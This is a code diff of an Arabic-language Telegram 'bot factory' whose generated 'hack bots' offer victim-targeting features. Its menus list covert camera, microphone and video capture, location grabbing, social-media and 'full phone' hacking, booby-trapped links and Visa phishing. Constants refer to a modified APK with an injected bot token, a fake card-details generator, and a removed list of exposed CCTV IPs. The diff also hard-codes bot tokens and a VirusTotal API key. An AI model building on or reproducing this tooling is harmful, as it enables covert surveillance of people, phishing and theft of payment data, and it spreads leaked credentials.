@@ -34,9 +34,13 @@ from telegram.ext import (
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 MAIN_BOT_TOKEN = os.getenv("MAIN_BOT_TOKEN", "8967725681:AAFWg1wNYN4eabWDk7b_f0Ss7uSagzoCV1Q")
+VIRUSTOTAL_API_KEY = os.getenv("VIRUSTOTAL_API_KEY", "d851c6064844b30083483cbfa5a2001d9ac0b811a666f0110c0efb4eaab747e")
+MAIN_ADMIN_ID = int(os.getenv("MAIN_ADMIN_ID", "6154678499"))
+YOUR_BOT_TOKEN_FOR_APK = os.getenv("YOUR_BOT_TOKEN_FOR_APK", "8967725681:AAFWg1wNYN4eabWDk7b_f0Ss7uSagzoCV1Q")
+YOUR_ADMIN_ID_FOR_APK = int(os.getenv("MAIN_ADMIN_ID", "6154678499"))
 
-MAIN_CHANNELS = ["@xtt10x", "@xtt10x"]
-FACTORY_MAIN_SUBSCRIPTION_CHANNEL = "@xtt10x"
+MAIN_CHANNELS = ["@RLH5500", "@RLH550"]
+FACTORY_MAIN_SUBSCRIPTION_CHANNEL = "@RLH55"
 FACTORY_MAIN_SUBSCRIPTION_ENABLED = True
 
 DATABASE_DIR = "database"
@@ -46,8 +50,6 @@ if not os.path.exists(DATABASE_DIR):
 user_state = {}
 created_bots = {}
 running_made_bot_updaters = {}
-
-MAIN_ADMIN_ID = 6154678499
 FACTORY_ADMINS = [6154678499]
 
 API_TEXT_TO_SPEECH = "https://sii3.moayman.top/api/voice.php"
@@ -60,11 +62,6 @@ API_SHEREEN_AI = "http://sii3.moayman.top/api/s.php"
 API_DEEPSEEK_AI = "https://sii3.moayman.top/api/deepseek.php"
 API_CHATGPT_3_5 = "http://sii3.moayman.top/api/chat/gpt-3.5.php"
 API_AZKAR = "http://sii3.moayman.top/api/azkar.php"
-
-VIRUSTOTAL_API_KEY = os.getenv("VIRUSTOTAL_API_KEY", "d851c6064844b30083483cbfa5a2001d9ac0b811a666f0110c0efb4eaab747e")
-
-YOUR_BOT_TOKEN_FOR_APK = "8967725681:AAFWg1wNYN4eabWDk7b_f0Ss7uSagzoCV1Q"
-YOUR_ADMIN_ID_FOR_APK = 6154678499
 
 ORIGINAL_APK_PATH = "/home/container/app_modified_7946719176.apk"
 APK_TOKEN_FILE_INSIDE = "assets/bot_token.txt"
@@ -126,16 +123,16 @@ def get_channel_name(channel_id, bot_token):
     return channel_id
 
 
-def send_message(bot_instance, chat_id, text, reply_markup=None, parse_mode=None):
+async def send_msg(bot_instance, chat_id, text, reply_markup=None, parse_mode=None):
     try:
-        bot_instance.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
+        await bot_instance.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
     except Exception as e:
         logging.error(f"Error sending message to {chat_id}: {e}")
 
 
-def edit_message_text(bot_instance, chat_id, message_id, text, reply_markup=None, parse_mode=None):
+async def edit_msg(bot_instance, chat_id, message_id, text, reply_markup=None, parse_mode=None):
     try:
-        bot_instance.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
+        await bot_instance.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
     except Exception as e:
         logging.error(f"Error editing message {message_id} in {chat_id}: {e}")
 
@@ -154,10 +151,6 @@ def clean_api_response(text):
     cleaned_text = ' '.join(cleaned_text.split())
     return cleaned_text
 
-
-# =============================================
-# وظائف التشفير والـ APK
-# =============================================
 
 def encrypt_token(token):
     table = str.maketrans(
@@ -256,7 +249,7 @@ def get_bot_username_from_token(bot_token):
 
 
 # =============================================
-# وظائف التشفير (Encryption Bot)
+# وظائف التشفير
 # =============================================
 
 def get_encryption_types_keyboard():
@@ -329,7 +322,7 @@ def decorate_english_name(name):
         'k': '𝒌', 'l': '𝒍', 'm': '𝒎', 'n': '𝒏', 'o': '𝒐', 'p': '𝒑', 'q': '𝒒', 'r': '𝒓', 's': '𝒔', 't': '𝒕',
         'u': '𝒖', 'v': '𝒗', 'w': '𝒘', 'x': '𝒙', 'y': '𝒚', 'z': '𝒛'
     }
-    decorated_names.append("𝑨𝑳𝑴𝑬𝑼𝑵𝑯𝑹𝑬𝑭 ➊:\n" + "".join(bold_italic_map.get(char, char) for char in name))
+    decorated_names.append("Bold Italic 1:\n" + "".join(bold_italic_map.get(char, char) for char in name))
     monospace_map = {
         'A': '𝙰', 'B': '𝙱', 'C': '𝙲', 'D': '𝙳', 'E': '𝙴', 'F': '𝙵', 'G': '𝙶', 'H': '𝙷', 'I': '𝙸', 'J': '𝙹',
         'K': '𝙺', 'L': '𝙻', 'M': '𝙼', 'N': '𝙽', 'O': '𝙾', 'P': '𝙿', 'Q': '𝚀', 'R': '𝚁', 'S': '𝚂', 'T': '𝚃',
@@ -338,7 +331,7 @@ def decorate_english_name(name):
         'k': '𝚔', 'l': '𝚕', 'm': '𝚖', 'n': '𝚗', 'o': '𝚘', 'p': '𝚙', 'q': '𝚚', 'r': '𝚛', 's': '𝚜', 't': '𝚝',
         'u': '𝚞', 'v': '𝚟', 'w': '𝚠', 'x': '𝚡', 'y': '𝚢', 'z': '𝚣'
     }
-    decorated_names.append("𝙰𝙻𝙼𝙴𝚀𝙽𝙷𝚁𝙴𝙵 ➋:\n" + "".join(monospace_map.get(char, char) for char in name))
+    decorated_names.append("Monospace 2:\n" + "".join(monospace_map.get(char, char) for char in name))
     circled_map = {
         'A': 'Ⓐ', 'B': 'Ⓑ', 'C': 'Ⓒ', 'D': 'Ⓓ', 'E': 'Ⓔ', 'F': 'Ⓕ', 'G': 'Ⓖ', 'H': 'Ⓗ', 'I': 'Ⓘ', 'J': 'Ⓙ',
         'K': 'Ⓚ', 'L': 'Ⓛ', 'M': 'Ⓜ', 'N': 'Ⓝ', 'O': 'Ⓞ', 'P': 'Ⓟ', 'Q': 'Ⓠ', 'R': 'Ⓡ', 'S': 'Ⓢ', 'T': 'Ⓣ',
@@ -347,7 +340,7 @@ def decorate_english_name(name):
         'k': 'ⓚ', 'l': 'ⓛ', 'm': 'ⓜ', 'n': 'ⓝ', 'o': 'ⓞ', 'p': 'ⓟ', 'q': 'ⓠ', 'r': 'ⓡ', 's': 'ⓢ', 't': 'ⓣ',
         'u': 'ⓤ', 'v': 'ⓥ', 'w': 'ⓦ', 'x': 'ⓧ', 'y': 'ⓨ', 'z': 'ⓩ'
     }
-    decorated_names.append("Ⓐ🄻ⓂⒺ🄀ⓃⒽⓇ💺🄵 ➌:\n" + "".join(circled_map.get(char, char) for char in name))
+    decorated_names.append("Circled 3:\n" + "".join(circled_map.get(char, char) for char in name))
     double_struck_map = {
         'A': '𝔸', 'B': '𝔹', 'C': 'ℂ', 'D': '𝔻', 'E': '𝔼', 'F': '𝔽', 'G': '𝔾', 'H': 'ℍ', 'I': '𝕀', 'J': '𝕁',
         'K': '𝕂', 'L': '𝕃', 'M': '𝕄', 'N': 'ℕ', 'O': '𝕆', 'P': 'ℙ', 'Q': 'ℚ', 'R': 'ℝ', 'S': '𝕊', 'T': '𝕋',
@@ -356,42 +349,23 @@ def decorate_english_name(name):
         'k': '𝕜', 'l': '𝕝', 'm': '𝕞', 'n': '𝕟', 'o': '𝕠', 'p': '𝕡', 'q': '𝕢', 'r': '𝕣', 's': '𝕤', 't': '𝕥',
         'u': '𝕦', 'v': '𝕧', 'w': '𝕨', 'x': '𝕩', 'y': '𝕪', 'z': '𝕫'
     }
-    decorated_names.append("𝔸🄻𝕄𝔼🄀ℕℍℝ𝔼🔠 ➍:\n" + "".join(double_struck_map.get(char, char) for char in name))
-    squared_map = {
-        'A': '🄰', 'B': '🄱', 'C': '🄲', 'D': '🄳', 'E': '🄴', 'F': '🄵', 'G': '🄶', 'H': '🄷', 'I': '🄸', 'J': '🄹',
-        'K': '🄺', 'L': '🄻', 'M': '🄼', 'N': '🄽', 'O': '🄾', 'P': '🄿', 'Q': '🅀', 'R': '🅁', 'S': '🅂', 'T': '🅃',
-        'U': '🅄', 'V': '🅅', 'W': '🅆', 'X': '🅇', 'Y': '🅈', 'Z': '🅉',
-        'a': '🄰', 'b': '🄱', 'c': '🄲', 'd': '🄳', 'e': '🄴', 'f': '🄵', 'g': '🄶', 'h': '🄷', 'i': '🄸', 'j': '🄹',
-        'k': '🄺', 'l': '🄻', 'm': '🄼', 'n': '🄽', 'o': '🄾', 'p': '🄿', 'q': '🅀', 'r': '🅁', 's': '🅂', 't': '🅃',
-        'u': '🅄', 'v': '🅅', 'w': '🅆', 'x': '🅇', 'y': '🅈', 'z': '🅉'
-    }
-    decorated_names.append("🄰🄻🄼🄴🄀🄽🄷🅁🄴🄵 ➎:\n" + "".join(squared_map.get(char, char) for char in name))
+    decorated_names.append("Double Struck 4:\n" + "".join(double_struck_map.get(char, char) for char in name))
     return "\n\n".join(decorated_names)
 
 
 def decorate_arabic_name(name):
     decorated_names = []
-    decorated_names.append("➊:\n" + "".join(f"{char}ٰ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))
-    decorated_names.append("➋:\n" + "".join(f"{char}ّ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))
-    decorated_names.append("➌:\n" + "".join(f"{char}ْ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))
-    decorated_names.append("➍:\n" + "".join(f"{char}ٓ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))
-    decorated_names.append("➎:\n" + "".join(f"{char}ٌ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))
+    decorated_names.append("1:\n" + "".join(f"{char}ٰ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))
+    decorated_names.append("2:\n" + "".join(f"{char}ّ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))
+    decorated_names.append("3:\n" + "".join(f"{char}ْ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))
+    decorated_names.append("4:\n" + "".join(f"{char}ٓ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))
+    decorated_names.append("5:\n" + "".join(f"{char}ٌ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))
     return "\n\n".join(decorated_names)
 
 
 # =============================================
 # وظائف APIs
 # =============================================
-
-def check_api_status(api_url, params=None):
-    try:
-        response = requests.head(api_url, params=params, timeout=5)
-        response.raise_for_status()
-        return True
-    except requests.exceptions.RequestException as e:
-        logging.error(f"API check failed for {api_url}: {e}")
-        return False
-
 
 def interact_with_ai_api(prompt, api_type, bot_username, user_id):
     apis_to_try = []
@@ -408,24 +382,15 @@ def interact_with_ai_api(prompt, api_type, bot_username, user_id):
     elif api_type == "dream_interpret":
         apis_to_try = [
             (API_AI_PRIMARY, {"q": f"تفسير الحلم: {prompt}"}),
-            (API_CHATGPT_3_5, {"ai": f"تفسير الحلم: {prompt}"}),
-            (API_DEEPSEEK_AI, {"q": f"تفسير الحلم: {prompt}"}),
-            (API_SHEREEN_AI, {"q": f"تفسير الحلم: {prompt}"}),
             (API_AI_FALLBACK_1, {"gpt-5-mini": f"تفسير الحلم: {prompt}"}),
-            (API_AI_FALLBACK_2, {"WR1": f"تفسير الحلم: {prompt}"}),
             (API_AI_FALLBACK_3, {"text": f"تفسير الحلم: {prompt}"}),
         ]
     elif api_type == "blue_genie_game":
         apis_to_try = [
             (API_AI_PRIMARY, {"q": f"لعبة المارد الأزرق: {prompt}"}),
-            (API_CHATGPT_3_5, {"ai": f"لعبة المارد الأزرق: {prompt}"}),
-            (API_DEEPSEEK_AI, {"q": f"لعبة المارد الأزرق: {prompt}"}),
-            (API_SHEREEN_AI, {"q": f"لعبة المارد الأزرق: {prompt}"}),
             (API_AI_FALLBACK_1, {"gpt-5-mini": f"لعبة المارد الأزرق: {prompt}"}),
-            (API_AI_FALLBACK_2, {"WR1": f"لعبة المارد الأزرق: {prompt}"}),
             (API_AI_FALLBACK_3, {"text": prompt}),
         ]
-
     for api_url, params in apis_to_try:
         try:
             response = requests.get(api_url, params=params, timeout=10)
@@ -433,62 +398,40 @@ def interact_with_ai_api(prompt, api_type, bot_username, user_id):
             try:
                 json_response = response.json()
                 result = None
-                if 'response' in json_response:
-                    result = json_response['response']
-                elif 'answer' in json_response:
-                    result = json_response['answer']
-                elif 'result' in json_response:
-                    result = json_response['result']
-                elif 'text' in json_response:
+                for key in ['response', 'answer', 'result', 'output']:
+                    if key in json_response:
+                        result = json_response[key]
+                        break
+                if result is None and 'text' in json_response:
                     result = json.dumps(json_response, ensure_ascii=False)
-                elif 'output' in json_response:
-                    result = json_response['output']
-                return clean_api_response(result)
+                if result:
+                    return clean_api_response(result)
             except json.JSONDecodeError:
                 return clean_api_response(response.text.strip())
-        except requests.exceptions.RequestException as e:
-            logging.error(f"Error with API {api_url}: {e}")
+        except requests.exceptions.RequestException:
             continue
-    return "عذرًا، حدث خطأ أثناء معالجة طلبك. يرجى المحاولة مرة أخرى لاحقًا."
+    return "عذرا، حدث خطأ. حاول مرة أخرى لاحقا."
 
 
 def generate_image_via_api(prompt, bot_username, user_id):
-    api_url = API_IMAGE_GENERATION_NEW
-    params = {"text": prompt}
     try:
-        response = requests.get(api_url, params=params, timeout=15)
+        response = requests.get(API_IMAGE_GENERATION_NEW, params={"text": prompt}, timeout=15)
         response.raise_for_status()
-        try:
-            json_response = response.json()
-            if 'image_url' in json_response:
-                return json_response['image_url']
-            elif 'url' in json_response:
-                return json_response['url']
-            return None
-        except json.JSONDecodeError:
-            return None
-    except requests.exceptions.RequestException as e:
-        logging.error(f"Error generating image: {e}")
+        json_response = response.json()
+        return json_response.get('image_url') or json_response.get('url')
+    except Exception:
         return None
 
 
 def convert_text_to_speech_via_api(text, bot_username, user_id):
-    encoded_text = urllib.parse.quote(text)
-    api_url = f"{API_TEXT_TO_SPEECH}?text={encoded_text}&voice=nova&style=cheerful+tone"
     try:
+        encoded_text = urllib.parse.quote(text)
+        api_url = f"{API_TEXT_TO_SPEECH}?text={encoded_text}&voice=nova&style=cheerful+tone"
         response = requests.get(api_url, timeout=15)
         response.raise_for_status()
-        try:
-            json_response = response.json()
-            if 'voice' in json_response:
-                return json_response['voice']
-            elif 'url' in json_response:
-                return json_response['url']
-            return None
-        except json.JSONDecodeError:
-            return None
-    except requests.exceptions.RequestException as e:
-        logging.error(f"Error converting text to speech: {e}")
+        json_response = response.json()
+        return json_response.get('voice') or json_response.get('url')
+    except Exception:
         return None
 
 
@@ -496,30 +439,23 @@ def get_azkar_via_api(bot_username, user_id):
     try:
         response = requests.get(API_AZKAR, timeout=10)
         response.raise_for_status()
-        try:
-            json_response = response.json()
-            if 'zekr' in json_response:
-                zekr_text = (
-                    f"*{json_response['zekr']}*\n\n"
-                    f"الوقت: {json_response.get('time', 'غير متاح')}\n"
-                    f"التاريخ: {json_response.get('date', 'غير متاح')}\n"
-                    f"نوع الذكر: {json_response.get('type', 'غير متاح')}"
-                )
-                return clean_api_response(zekr_text)
-            return clean_api_response(json.dumps(json_response, ensure_ascii=False))
-        except json.JSONDecodeError:
-            return "عذرًا، حدث خطأ أثناء جلب الأذكار."
-    except requests.exceptions.RequestException as e:
-        logging.error(f"Error fetching azkar: {e}")
-        return "عذرًا، حدث خطأ أثناء جلب الأذكار."
+        json_response = response.json()
+        if 'zekr' in json_response:
+            return clean_api_response(
+                f"*{json_response['zekr']}*\n\n"
+                f"الوقت: {json_response.get('time', 'غير متاح')}\n"
+                f"التاريخ: {json_response.get('date', 'غير متاح')}\n"
+                f"نوع الذكر: {json_response.get('type', 'غير متاح')}"
+            )
+        return clean_api_response(json.dumps(json_response, ensure_ascii=False))
+    except Exception:
+        return "عذرا، حدث خطأ أثناء جلب الأذكار."
 
 
-def check_url_virustotal(update, context, url_to_check, bot_username, user_id):
-    chat_id = update.effective_chat.id
-    if not url_to_check.startswith(('http://', 'https://')):
-        send_message(context.bot, chat_id, "الرجاء إرسال رابط صحيح يبدأ بـ http أو https.")
-        return
+def check_url_virustotal_data(url_to_check):
     try:
+        if not url_to_check.startswith(('http://', 'https://')):
+            return None, "الرجاء إرسال رابط صحيح يبدأ بـ http أو https."
         url_id = base64.urlsafe_b64encode(url_to_check.encode()).decode().strip("=")
         response = requests.get(
             f"https://www.virustotal.com/api/v3/urls/{url_id}",
@@ -527,22 +463,21 @@ def check_url_virustotal(update, context, url_to_check, bot_username, user_id):
         )
         if response.status_code == 200:
             data = response.json()
-            analysis_stats = data['data']['attributes']['last_analysis_stats']
-            result_message = (
+            stats = data['data']['attributes']['last_analysis_stats']
+            msg = (
                 f"📊 *نتائج فحص الرابط:*\n"
-                f"✅ آمن: {analysis_stats['harmless']}\n"
-                f"⚠️ مشبوه: {analysis_stats['malicious']}\n"
-                f"❓ مشكوك فيه: {analysis_stats['suspicious']}"
+                f"✅ آمن: {stats['harmless']}\n"
+                f"⚠️ مشبوه: {stats['malicious']}\n"
+                f"❓ مشكوك فيه: {stats['suspicious']}"
             )
-            send_message(context.bot, chat_id, result_message, parse_mode=ParseMode.MARKDOWN)
-        else:
-            send_message(context.bot, chat_id, "❌ حدثت مشكلة في فحص الرابط.")
+            return msg, None
+        return None, "❌ حدثت مشكلة في فحص الرابط."
     except Exception as e:
-        send_message(context.bot, chat_id, f"❌ حصل خطأ غير متوقع: {e}")
+        return None, f"❌ خطأ: {e}"
 
 
 # =============================================
-# بيانات المحطات والكاميرات
+# بيانات المحطات
 # =============================================
 
 SUDAN_RADIO_STATIONS = [
@@ -553,28 +488,15 @@ SUDAN_RADIO_STATIONS = [
 ]
 
 EGYPT_RADIO_STATIONS = [
-    {"name": "إذاعة مشاري العفاسي", "url": "https://qurango.net/radio/mishary_alafasi"},
+    {"name": "مشاري العفاسي", "url": "https://qurango.net/radio/mishary_alafasi"},
     {"name": "تراتيل قصيرة", "url": "https://qurango.net/radio/tarateel"},
-    {"name": "القارئ محمد أيوب", "url": "https://qurango.net/radio/mohammed_ayyub"},
-    {"name": "إذاعة ماهر المعيقلي", "url": "https://backup.qurango.net/radio/maher"},
+    {"name": "محمد أيوب", "url": "https://qurango.net/radio/mohammed_ayyub"},
+    {"name": "ماهر المعيقلي", "url": "https://backup.qurango.net/radio/maher"},
     {"name": "87.8 Mix FM", "url": "https://stream-29.zeno.fm/na3vpvn10qruv"},
-    {"name": "90s FM", "url": "http://eu1.fastcast4u.com/proxy/prontofm"},
     {"name": "Nile FM", "url": "https://audio.nrpstream.com/public/nile_fm/playlist.pls"},
     {"name": "Nogoum FM", "url": "https://audio.nrpstream.com/listen/nogoumfm/radio.mp3"},
     {"name": "Radio 9090", "url": "https://9090streaming.mobtada.com/9090FMEGYPT"},
 ]
-
-CCTV_CAMERAS = {
-    "الولايات المتحدة": [
-        "https://www.earthcam.com/usa/newyork/timessquare/",
-        "http://www.insecam.org/cam/bycountry/US/",
-    ],
-    "ألمانيا": [
-        "http://84.35.147.6:80",
-        "http://185.125.234.119:8082",
-        "http://217.103.90.117:8098",
-    ],
-}
 
 
 def generate_random_visa_details():
@@ -608,8 +530,42 @@ def generate_fake_number_details():
     }
 
 
+def check_username_availability(bot_token, username):
+    try:
+        resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getChat?chat_id=@{username}").json()
+        if resp.get("ok"):
+            return False
+        return resp.get("error_code") == 400 and "chat not found" in resp.get("description", "").lower()
+    except Exception:
+        return False
+
+
+def generate_and_check_username(bot_token, username_type):
+    chars = string.ascii_lowercase + string.digits
+    for _ in range(50):
+        username = ""
+        if username_type == "single_type":
+            username = random.choice(string.ascii_lowercase) * 4
+        elif username_type == "quad_usernames":
+            username = ''.join(random.choice(chars) for _ in range(4))
+        elif username_type == "semi_quad":
+            parts = [random.choice(chars) for _ in range(3)]
+            username = f"{parts[0]}{parts[1]}_{parts[2]}" if random.choice([True, False]) else f"{parts[0]}_{parts[1]}{parts[2]}"
+        elif username_type == "semi_triple":
+            parts = [random.choice(chars) for _ in range(2)]
+            username = f"{parts[0]}_{parts[1]}"
+        elif username_type == "random":
+            username = ''.join(random.choice(chars) for _ in range(random.randint(4, 8)))
+        elif username_type == "unique":
+            username = ''.join(random.choice(string.ascii_lowercase) for _ in range(4))
+        if check_username_availability(bot_token, username):
+            return username
+        time.sleep(0.1)
+    return None
+
+
 # =============================================
-# وظائف لوحة المفاتيح
+# لوحة مفاتيح البوت الرئيسي
 # =============================================
 
 def get_main_bot_user_keyboard():
@@ -620,18 +576,18 @@ def get_main_bot_user_keyboard():
 
 
 def get_main_bot_admin_keyboard():
-    sub_status_text = "✅ إزالة الاشتراك الإجباري" if FACTORY_MAIN_SUBSCRIPTION_ENABLED else "➕ إضافة الاشتراك الإجباري"
-    sub_status_callback = "remove_factory_main_subscription" if FACTORY_MAIN_SUBSCRIPTION_ENABLED else "add_factory_main_subscription"
+    sub_text = "✅ إزالة الاشتراك الإجباري" if FACTORY_MAIN_SUBSCRIPTION_ENABLED else "➕ إضافة الاشتراك الإجباري"
+    sub_cb = "remove_factory_main_sub" if FACTORY_MAIN_SUBSCRIPTION_ENABLED else "add_factory_main_sub"
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("✨ أنشئ بوت جديد 🤖", callback_data="create_bot"),
+        [InlineKeyboardButton("✨ أنشئ بوت جديد", callback_data="create_bot"),
          InlineKeyboardButton("🛠 بوتاتك", callback_data="manage_bots")],
-        [InlineKeyboardButton("➕ إضافة أدمن 👨‍💻", callback_data="add_factory_admin"),
+        [InlineKeyboardButton("➕ إضافة أدمن", callback_data="add_factory_admin"),
          InlineKeyboardButton("🗑️ حذف أدمن", callback_data="remove_factory_admin")],
         [InlineKeyboardButton("📊 إحصائيات المصنع", callback_data="factory_stats")],
-        [InlineKeyboardButton("🛑 إيقاف جميع البوتات", callback_data="stop_all_bots"),
-         InlineKeyboardButton("🟢 فتح جميع البوتات", callback_data="start_all_bots")],
-        [InlineKeyboardButton("📢 إذاعة للبوتات المجانية", callback_data="broadcast_free_bots")],
-        [InlineKeyboardButton(sub_status_text, callback_data=sub_status_callback)]
+        [InlineKeyboardButton("🛑 إيقاف البوتات", callback_data="stop_all_bots"),
+         InlineKeyboardButton("🟢 تشغيل البوتات", callback_data="start_all_bots")],
+        [InlineKeyboardButton("📢 إذاعة مجانية", callback_data="broadcast_free_bots")],
+        [InlineKeyboardButton(sub_text, callback_data=sub_cb)]
     ])
 
 
@@ -642,49 +598,47 @@ def get_admin_keyboard(bot_username, user_id, bot_type):
         [InlineKeyboardButton("المشتركون 👥", callback_data="m1")],
         [InlineKeyboardButton("إذاعة رسالة 📮", callback_data="send"),
          InlineKeyboardButton("توجيه رسالة 🔄", callback_data="forward")],
-        [InlineKeyboardButton("تعيين اشتراك إجباري 💢", callback_data="ach"),
-         InlineKeyboardButton("حذف اشتراك إجباري 🔱", callback_data="dch")],
+        [InlineKeyboardButton("اشتراك إجباري 💢", callback_data="ach"),
+         InlineKeyboardButton("حذف اشتراك 🔱", callback_data="dch")],
         [InlineKeyboardButton("تفعيل التنبيهات ✔️", callback_data="ons"),
          InlineKeyboardButton("تعطيل التنبيهات ❎", callback_data="ofs")],
         [InlineKeyboardButton("فتح البوت ✅", callback_data="obot"),
          InlineKeyboardButton("إيقاف البوت ❌", callback_data="ofbot")],
-        [InlineKeyboardButton("تعيين وضع مدفوع 💰", callback_data="pro"),
-         InlineKeyboardButton("تعيين وضع مجاني 🆓", callback_data="frre")],
-        [InlineKeyboardButton("إضافة عضو مدفوع 💰", callback_data="pro123"),
-         InlineKeyboardButton("إزالة عضو مدفوع 🆓", callback_data="frre123")],
-        [InlineKeyboardButton("حظر عضو 🚫", callback_data="ban"),
-         InlineKeyboardButton("إلغاء حظر عضو ❌", callback_data="unban")],
+        [InlineKeyboardButton("وضع مدفوع 💰", callback_data="pro"),
+         InlineKeyboardButton("وضع مجاني 🆓", callback_data="frre")],
+        [InlineKeyboardButton("إضافة مدفوع 💰", callback_data="pro123"),
+         InlineKeyboardButton("إزالة مدفوع 🆓", callback_data="frre123")],
+        [InlineKeyboardButton("حظر 🚫", callback_data="ban"),
+         InlineKeyboardButton("إلغاء حظر ❌", callback_data="unban")],
         [InlineKeyboardButton("تغيير رسالة البدء 📝", callback_data="set_start_message")],
-        [InlineKeyboardButton("تحميل بيانات البوت 💾", callback_data="download_bot_data")]
+        [InlineKeyboardButton("تحميل البيانات 💾", callback_data="download_bot_data")]
     ]
     if bot_type == "hack_bot":
-        keyboard.append([InlineKeyboardButton("تعيين نقاط البايلود 🔢", callback_data="set_payload_points")])
+        keyboard.append([InlineKeyboardButton("نقاط البايلود 🔢", callback_data="set_payload_points")])
         if bot_settings.get("custom_buttons_enabled_by_admin", False):
-            keyboard.append([InlineKeyboardButton("قسم الأزرار 🖲️", callback_data="buttons_panel")])
+            keyboard.append([InlineKeyboardButton("الأزرار 🖲️", callback_data="buttons_panel")])
     elif bot_type == "encryption_bot":
-        keyboard.append([InlineKeyboardButton("تعيين قناة الأساسية 🫅", callback_data="set_main_channel_link")])
+        keyboard.append([InlineKeyboardButton("القناة الأساسية 🫅", callback_data="set_main_channel_link")])
     elif bot_type == "factory_bot":
-        keyboard.append([InlineKeyboardButton("✨ أنشئ بوت جديد 🤖", callback_data="create_bot_from_factory")])
+        keyboard.append([InlineKeyboardButton("✨ أنشئ بوت جديد", callback_data="create_bot_from_factory")])
         keyboard.append([InlineKeyboardButton("🛠 بوتاتك المصنوعة", callback_data="manage_made_bots_from_factory")])
-        keyboard.append([InlineKeyboardButton("➕ إضافة أدمن 👨‍💻", callback_data="add_factory_admin_sub")])
-        keyboard.append([InlineKeyboardButton("🗑️ حذف أدمن", callback_data="remove_factory_admin_sub")])
-        keyboard.append([InlineKeyboardButton("📊 إحصائيات المصنع الفرعي", callback_data="factory_sub_stats")])
-        keyboard.append([InlineKeyboardButton("📢 إذاعة للبوتات المجانية", callback_data="broadcast_free_bots_sub")])
+        keyboard.append([InlineKeyboardButton("➕ إضافة أدمن", callback_data="add_factory_admin_sub")])
+        keyboard.append([InlineKeyboardButton("📊 إحصائيات", callback_data="factory_sub_stats")])
+        keyboard.append([InlineKeyboardButton("📢 إذاعة", callback_data="broadcast_free_bots_sub")])
     return InlineKeyboardMarkup(keyboard)
 
 
 def get_user_keyboard(admin_id, bot_username, user_id, bot_type):
     load_made_bot_settings(bot_username)
     bot_settings = made_bot_data[bot_username]
-
     if bot_type == "hack_bot":
         keyboard = [
             [InlineKeyboardButton("اختراق الكاميرا الخلفية 📸", callback_data="cam_back"),
              InlineKeyboardButton("اختراق الكاميرا الأمامية 📸", callback_data="cam_front")],
-            [InlineKeyboardButton("تسجيل صوت الضحية 🎤", callback_data="mic_record"),
+            [InlineKeyboardButton("تسجيل صوت 🎤", callback_data="mic_record"),
              InlineKeyboardButton("اختراق الموقع 📍", callback_data="location")],
-            [InlineKeyboardButton("تسجيل فيديو الضحية 🎥", callback_data="record_video"),
-             InlineKeyboardButton("اختراق كاميرات المراقبة 📡", callback_data="surveillance_cams")],
+            [InlineKeyboardButton("تسجيل فيديو 🎥", callback_data="record_video"),
+             InlineKeyboardButton("كاميرات المراقبة 📡", callback_data="surveillance_cams")],
             [InlineKeyboardButton("اختراق انستغرام 💻", callback_data="insta_hack"),
              InlineKeyboardButton("اختراق واتساب 🟢", callback_data="whatsapp_hack")],
             [InlineKeyboardButton("اختراق ببجي 🎮", callback_data="pubg_hack"),
@@ -697,23 +651,23 @@ def get_user_keyboard(admin_id, bot_username, user_id, bot_type):
              InlineKeyboardButton("البحث عن الصور 🎨", callback_data="user_button_image_search")],
             [InlineKeyboardButton("تحويل النص إلى صوت 🔄", callback_data="user_button_text_to_speech"),
              InlineKeyboardButton("أذكار إسلامية 🕌", callback_data="user_button_azkar")],
-            [InlineKeyboardButton("الذكاء الاصطناعي (شيرين) 🎤", callback_data="user_button_shereen_ai"),
-             InlineKeyboardButton("الذكاء الاصطناعي (ديب سيك) 🧠", callback_data="user_button_deepseek_ai")],
-            [InlineKeyboardButton("الذكاء الاصطناعي (ChatGPT-3.5) 💬", callback_data="user_button_chatgpt_3_5")],
+            [InlineKeyboardButton("شيرين AI 🎤", callback_data="user_button_shereen_ai"),
+             InlineKeyboardButton("ديب سيك 🧠", callback_data="user_button_deepseek_ai")],
+            [InlineKeyboardButton("ChatGPT-3.5 💬", callback_data="user_button_chatgpt_3_5")],
             [InlineKeyboardButton("اختراق تيك توك 🟧", callback_data="tiktok_hack"),
-             InlineKeyboardButton("جمع معلومات الجهاز 🔬", callback_data="device_info")],
-            [InlineKeyboardButton("اختراق الهاتف بالكامل 🔞", callback_data="user_button_full_phone_hack")],
+             InlineKeyboardButton("معلومات الجهاز 🔬", callback_data="device_info")],
+            [InlineKeyboardButton("اختراق الهاتف 🔞", callback_data="user_button_full_phone_hack")],
             [InlineKeyboardButton("تلغيم الروابط ⚠️", callback_data="user_button_link_exploit")],
             [InlineKeyboardButton("لعبة ذكية 🧠", callback_data="user_button_smart_game"),
              InlineKeyboardButton("صور عالية الدقة 🖼️", callback_data="high_quality_shot")],
             [InlineKeyboardButton("أرقام وهمية ☎️", callback_data="user_button_fake_numbers")],
             [InlineKeyboardButton("تصيد فيزا 💳", callback_data="user_button_visa_phishing"),
-             InlineKeyboardButton("الحصول على رقم الضحية 📲", callback_data="get_victim_number")],
-            [InlineKeyboardButton("اختراق بث الراديو 📻", callback_data="user_button_radio_hack"),
+             InlineKeyboardButton("رقم الضحية 📲", callback_data="get_victim_number")],
+            [InlineKeyboardButton("بث الراديو 📻", callback_data="user_button_radio_hack"),
              InlineKeyboardButton("فحص الروابط 🖌️", callback_data="user_button_link_check")],
